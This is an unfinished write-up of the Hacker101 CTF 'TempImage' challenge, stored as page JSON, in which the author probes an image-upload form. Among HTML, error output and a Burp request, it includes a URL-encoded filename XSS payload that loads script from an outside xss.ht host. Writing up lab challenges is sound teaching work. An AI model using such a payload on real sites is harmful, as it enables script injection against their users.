{"pageProps":{"post":{"path":"blog/hacker101-ctf-tempimage","title":"Hacker101 CTF TempImage[moderate] Write-Up","subtitle":"a work in progress","published":true,"datePublished":1611357758022,"tags":["ctf","writeup","hackerone","TempImage","security"],"description":"A write up for the TempImage [moderate] challenge","canonicalUrl":"https://dev.lwlx.xyz/blog/hacker101-ctf-tempimage","author":"lwlx","authorPhoto":"/profile.jpg","authorTwitter":"0x0000005","bannerPhoto":"/hackerone/tempimage/tempimage-hackerone.jpg","thumbnailPhoto":"/hackerone/tempimage/tempimage-hackerone.jpg","content":"\n# TempImage _[moderate]_ `WIP`\n\nThis is my Write Up for the \"TempImage\" challenge of HackerOne's CTF.\n\nAs usual we get a link to webpage, it seems to some sort of cloud storage application, on the main Page we get a really simple page:\n\n```jsx\n<!-- https://ctf.hacker101.com/ctf/launch/12 -->\n\n<html>\n  <head>\n    <title>TempImage &mdash; Trial</title>\n  </head>\n  <body>\n    <h1>TempImage</h1>\n    <p>\n      <b>UNREGISTERED</b>\n    </p>\n    <p>\n      <a href=\"upload.php\">Upload image</a>\n    </p>\n  </body>\n</html>\n```\n\nIt signifies that its an UNEGISTERED version of the app, thus working in trial mode.\n\n## Enumeration\n\nSo lets start to explore the app and what it can do. We start by clicking the \"Upload image\" Button.\nThis leads us to a new page **/upload.php**, here we can select a file from our computer, and have a submit button to send the form.\n\nThe form will be sent to a **doUpload.php** file. Upon closer inspection we alos see that there is a hidden field \"filename\", which gets filled in by aJS snippet.\n\n```jsx\n   <h1>Upload</h1>\n\t\t<form action=\"doUpload.php\" method=\"POST\" enctype=\"multipart/form-data\">\n\t\t\t<input type=\"file\" name=\"file\" id=\"file\">\n\t\t\t<input type=\"hidden\" name=\"filename\" id=\"filename\">\n\t\t\t<input type=\"submit\" value=\"Upload\">\n\t\t</form>\n\t\t<script>\n\t\t\t$(document).ready(function() {\n\t\t\t\t$('#file').change(function(e) {\n\t\t\t\t\t$('#filename').val(e.target.files[0].name)\n\t\t\t\t})\n\t\t\t})\n\t </script>\n```\n\nSo it seems this lil script extracts the `file.name` prop from the fileOpbject the user uploads to the input type=\"file\".\n\nLets Try it out, It seems the file inpput allows any file to be chosen, lets try a 5mb .gif file.\n\n```jsx\n<center><h1>413 Request Entity Too Large</h1></center>\n<hr><center>nginx/1.14.0 (Ubuntu)</center>\n```\n\nOK, fair, maybe 5mb was a it large, but we know we're working with an nginx 1.14 server on Ubuntu.\nSo how about we try a smaller gif?\n\n```shell\nERROR: Only PNG format supported in trial.\n```\n\nOkay, finally we know what the app expects from us, a PNG file. So we try jsut that.\nThe upload succeeds, thus redirecting us to a new url:\n`/files/be9c26aaea9d9b5085c7f6eed0812745_uhhhh.png`\n\nso it seems our files are uploaded to the `/files/` directory, what a suprise, the file stil contains our original filename, preceeded by some gibberish.\n\nwe should deffinetly try to exploit this, check wheter or not they sanitize our filename.\n\nLets try uploading a file named: `javascript%3Aeval%28%27var%20a%3Ddocument.createElement%28%5C%27script%5C%27%29%3Ba.src%3D%5C%27https%3A%2F%2FDiscover.xss.ht%5C%27%3Bdocument.body.appendChild%28a%29%27%29.png`\n\nWe now get redirected to this url `http://35.190.155.168/d29c8e00db/files/9975e7e24fac21e8b877a6d08efe09c6_javascript%3Aeval%28%27var%20a%3Ddocument.createElement%28%5C%27script%5C%27%29%3Ba.src%3D%5C%27https%3A%2F%2FDiscover.xss.ht%5C%27%3Bdocument.body.appendChild%28a%29%27%29.png`\n\nand we get served this content:\n\n```javascript\nNot Found\nThe requested URL /files/9975e7e24fac21e8b877a6d08efe09c6_javascript:eval('var a=document.createElement(\\'script\\');a.src=\\'https:/Discover.xss.ht\\';document.body.appendChild(a)').png was not found on this server.\n\nApache/2.4.7 (Ubuntu) Server at 127.0.0.1 Port 52736\n```\n\nso it seems there is potential there, we just need a more sophisticated payload to upload.\n\n## Taking a step back\n\nIt's important not to get tunnelvision and only focus on your first finding, so lets take a step back and analyze the website using Burp Suite. Maybe we'll find something.\nLets analyze the upload URL first:\n\n```shell\nGET /d29c8e00db/upload.php HTTP/1.1\nHost: 35.190.155.168\nCache-Control: max-age=0\nUpgrade-Insecure-Requests: 1\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Safari/537.36\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9\nAccept-Encoding: gzip, deflate\nAccept-Language: en-GB,en-US;q=0.9,en;q=0.8\nConnection: close\n```\n\nThis does not tell us that much, it seems the server could accep more than just PNG tho.\n\nHow about if we upload an image?\n\n`POST /d29c8e00db/doUpload.php HTTP/1.1`\n\n![image upload Request](/hackerone/tempimage/tempimage-hackerone101-burpSuite_fileupload.png \"image upload Request\")\n\n> This Post is marked as `WIP` and will be updated continously.\n"}},"__N_SSG":true}